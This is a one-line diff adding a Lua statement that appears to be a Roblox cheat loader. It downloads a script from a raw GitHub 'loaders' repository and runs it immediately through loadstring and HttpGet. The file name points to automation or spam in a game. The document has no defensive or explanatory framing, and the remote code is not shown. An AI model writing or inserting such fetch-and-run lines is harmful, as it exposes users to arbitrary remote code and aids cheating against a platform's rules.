@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/clean-all-the-leaves-spam3-kp438v6qona1gi.lua"))()
